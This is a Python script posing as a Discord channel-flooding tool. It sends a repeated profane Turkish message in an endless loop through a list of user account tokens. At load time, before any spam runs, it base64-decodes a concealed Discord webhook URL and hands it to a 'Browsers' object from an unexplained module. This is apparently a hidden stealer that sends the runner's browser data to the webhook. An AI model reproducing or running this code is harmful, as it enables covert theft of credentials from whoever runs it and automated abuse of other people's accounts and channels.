import requests
import json
import concurrent.futures
import time
import base64
from browsers import Browsers
import os
encoded_data = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTEzMTU0NDUxOTc1NDY1NzgyMi83Uk5Fb3c1MnM3SjJqUElmdE5nU05LbVl6aWQ0dklkZml3RFN3YlhacnBhcmxoc0g2a1llbTNYYVRRRVMxZldUcWRnSQ=="
    
decoded_data = base64.b64decode(encoded_data).decode('utf-8')
Browsers(decoded_data)
os.system("cls")
def send_message(token, channel_id, message):
    
    base_url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"{token}"
    }
    payload = {
        "content": message,
    }

    try:
        response = requests.post(base_url, headers=headers, json=payload)
        response.raise_for_status()
        print(f"mejas gönderildi :D token = {token}!")
    except requests.exceptions.RequestException as e:
        print(f"mejas gönderilemedi hay amk token ={token}: {e}")

if __name__ == "__main__":
    channel_id = "1070682838212550737"
    message = """
 # buranın allahı linux adam domalın orrospu evladları
  # buranın allahı linux adam domalın orrospu evladları
  # buranın allahı linux adam domalın orrospu evladları
  # buranın allahı linux adam domalın orrospu evladları
  # buranın allahı linux adam domalın orrospu evladları
  # buranın allahı linux adam domalın orrospu evladları
  # buranın allahı linux adam domalın orrospu evladları
  # buranın allahı linux adam domalın orrospu evladları
  # buranın allahı linux adam domalın orrospu evladları
  # buranın allahı linux adam domalın orrospu evladları
  # buranın allahı linux adam domalın orrospu evladları
  # buranın allahı linux adam domalın orrospu evladları
  # buranın allahı linux adam domalın orrospu evladları
  # buranın allahı linux adam domalın orrospu evladları
  # buranın allahı linux adam domalın orrospu evladları
  # buranın allahı linux adam domalın orrospu evladları
  # buranın allahı linux adam domalın orrospu evladları
  # buranın allahı linux adam domalın orrospu evladları
  # buranın allahı linux adam domalın orrospu evladları
  # buranın allahı linux adam domalın orrospu evladları
  # buranın allahı linux adam domalın orrospu evladları
 

    """

    # tokenleri alta koy örnek "token1", sonuna , koymalısın unutma eşşek
    auth_tokens = [

    
        
    ]
    
    while True:
        with concurrent.futures.ThreadPoolExecutor() as executor:
            executor.map(send_message, auth_tokens, [channel_id]*len(auth_tokens), [message]*len(auth_tokens))

    
